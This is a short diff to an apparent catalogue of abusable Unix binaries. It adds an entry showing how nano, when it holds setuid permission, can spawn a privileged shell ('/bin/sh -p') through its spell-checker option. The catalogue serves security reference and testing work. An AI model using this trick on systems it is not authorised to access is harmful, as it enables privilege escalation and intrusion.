@@ -38,6 +38,10 @@ functions:
     contexts:
       sudo:
       suid:
+        code: |-
+          nano -s '/bin/sh -p'
+          /bin/sh -p
+          ^T^T
         shell: false
       unprivileged:
 ...
